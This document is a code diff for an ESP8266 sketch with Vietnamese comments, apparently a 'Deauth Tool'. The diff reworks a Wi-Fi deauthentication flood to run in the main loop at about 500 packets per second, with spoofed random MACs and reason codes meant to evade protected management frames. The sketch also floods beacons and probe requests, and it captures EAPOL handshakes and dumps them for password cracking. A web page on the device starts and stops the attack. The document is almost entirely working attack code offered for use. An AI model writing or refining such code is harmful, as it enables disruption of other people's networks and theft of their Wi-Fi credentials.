@@ -1,6 +1,5 @@
 #include <ESP8266WiFi.h>
-#include <ESP8266WebServer.h>  // Thêm thư viện cho web server
-#include <ESP8266TimerInterrupt.h>  // Install "ESP8266TimerInterrupt" qua Library Manager
+#include <ESP8266WebServer.h>  // Có sẵn trong core ESP8266
 
 extern "C" {
   #include "user_interface.h"
@@ -8,7 +7,7 @@ extern "C" {
 
 // CONFIG CỰC MẠNH
 #define CHANNEL 5               // Cố định channel 5
-#define DEAUTH_RATE 500         // Số gói/giây (max 500, cao quá treo)
+#define DEAUTH_INTERVAL 2       // Delay giữa gói deauth (ms) - nhỏ để flood mạnh (tương đương 500 gói/s)
 #define BEACON_SPAM_COUNT 50    // Số SSID fake khi spam
 #define PROBE_FLOOD_COUNT 100   // Số probe flood/giây
 #define RANDOM_REASON true      // Random reason code để bypass PMF
@@ -30,7 +29,7 @@ uint8_t deauthPacket[26] = {
   0x00, 0x00, 0x07, 0x00
 };
 
-// Web server tại port 80, IP 192.168.4.1
+// Web server tại port 80
 ESP8266WebServer server(80);
 
 // Callback sniffer
@@ -53,29 +52,7 @@ void sniffer_cb(uint8_t *buf, uint16_t len) {
   }
 }
 
-// Timer flood deauth
-ESP8266Timer *ITimer;
-
-void floodDeauth() {
-  if (!attackRunning) return;
-
-  // Random reason code
-  if (RANDOM_REASON) deauthPacket[24] = random(1, 11);
-
-  // Spoof MAC random
-  for (int i = 0; i < 6; i++) {
-    deauthPacket[10 + i] = random(0xFF);  // Source
-    deauthPacket[16 + i] = random(0xFF);  // BSSID
-  }
-
-  // Receiver = target MAC
-  memcpy(deauthPacket + 4, targetMac, 6);
-
-  wifi_send_pkt_freedom(deauthPacket, 26, 0);
-  Serial.print(".");
-}
-
-// Trang web chính
+// Trang web
 void handleRoot() {
   String html = "<html><body><h1>Deauth Tool</h1>";
   html += "<p>Status: " + String(attackRunning ? "Running" : "Stopped") + "</p>";
@@ -96,14 +73,14 @@ void handleRoot() {
   server.send(200, "text/html", html);
 }
 
-// Start attack qua web
+// Start attack
 void handleOn() {
   attackRunning = true;
   server.sendHeader("Location", "/");
   server.send(302);
 }
 
-// Stop attack qua web
+// Stop attack
 void handleOff() {
   attackRunning = false;
   server.sendHeader("Location", "/");
@@ -116,7 +93,7 @@ void setup() {
   Serial.println("\n[START] ESP8266 Deauth + Scan + Sniffer CUC MANH - Channel 5 with Web");
 
   WiFi.mode(WIFI_AP_STA);
-  WiFi.softAP("DeauthTool", "password123");  // Tạo AP: SSID "DeauthTool", pass "password123"
+  WiFi.softAP("DeauthTool", "password123");  // AP: SSID "DeauthTool", pass "password123"
   Serial.print("IP Web: ");
   Serial.println(WiFi.softAPIP());  // 192.168.4.1
 
@@ -132,15 +109,11 @@ void setup() {
   wifi_set_promiscuous_rx_cb(sniffer_cb);
   wifi_set_channel(CHANNEL);
 
-  // Timer flood
-  ITimer = new ESP8266Timer();
-  ITimer->attachInterruptInterval(1000 * 1000 / DEAUTH_RATE, floodDeauth);
-
   Serial.println("Da san sang - Truy cap 192.168.4.1 tu dien thoai!");
 }
 
 void loop() {
-  server.handleClient();  // Xử lý request web
+  server.handleClient();  // Xử lý web
 
   // Scan mỗi 10s
   static uint32_t lastScan = 0;
@@ -155,21 +128,38 @@ void loop() {
     lastScan = millis();
   }
 
+  // Flood deauth nếu attack chạy
+  static uint32_t lastDeauth = 0;
+  if (attackRunning && millis() - lastDeauth > DEAUTH_INTERVAL) {
+    if (RANDOM_REASON) deauthPacket[24] = random(1, 11);
+    for (int i = 0; i < 6; i++) {
+      deauthPacket[10 + i] = random(0xFF);
+      deauthPacket[16 + i] = random(0xFF);
+    }
+    memcpy(deauthPacket + 4, targetMac, 6);
+    wifi_send_pkt_freedom(deauthPacket, 26, 0);
+    Serial.print(".");
+    lastDeauth = millis();
+  }
+
   // Beacon spam nếu attack
-  if (attackRunning) {
+  static uint32_t lastBeacon = 0;
+  if (attackRunning && millis() - lastBeacon > 100) {
     for (int i = 0; i < BEACON_SPAM_COUNT; i++) {
       uint8_t beacon[128];
       memset(beacon, 0, 128);
       beacon[0] = 0x80;
       memcpy(beacon + 4, targetMac, 6);
       memcpy(beacon + 10, targetMac, 6);
-      sprintf((char*)beacon + 26, "FakeSSID_%d", i);
+      sprintf((char*)beacon + 26, "Fake_%d", i);
       wifi_send_pkt_freedom(beacon, 36, 0);
     }
+    lastBeacon = millis();
   }
 
   // Probe flood nếu attack
-  if (attackRunning) {
+  static uint32_t lastProbe = 0;
+  if (attackRunning && millis() - lastProbe > 10) {
     for (int i = 0; i < PROBE_FLOOD_COUNT; i++) {
       uint8_t probe[64];
       memset(probe, 0, 64);
@@ -178,24 +168,25 @@ void loop() {
       sprintf((char*)probe + 26, "Probe_%d", i);
       wifi_send_pkt_freedom(probe, 36, 0);
     }
+    lastProbe = millis();
   }
 
-  // Xử lý EAPOL nếu bắt được
+  // Xử lý EAPOL
   if (capturedEapol) {
     Serial.println("\n[SNIF] Da bat duoc EAPOL! Hex dump:");
     for (int i = 0; i < eapolLen; i++) {
       Serial.printf("%02X ", eapolBuffer[i]);
       if ((i+1) % 16 == 0) Serial.println();
     }
-    Serial.println("\nCopy hex de crack Hashcat!");
+    Serial.println("\nCopy hex de crack!");
     capturedEapol = false;
   }
 
   yield();
-  delay(1);
+  delay(1);  // Tránh treo
 }
 
-// Serial control vẫn có
+// Serial control (on/off)
 void serialEvent() {
   while (Serial.available()) {
     String cmd = Serial.readStringUntil('\n');
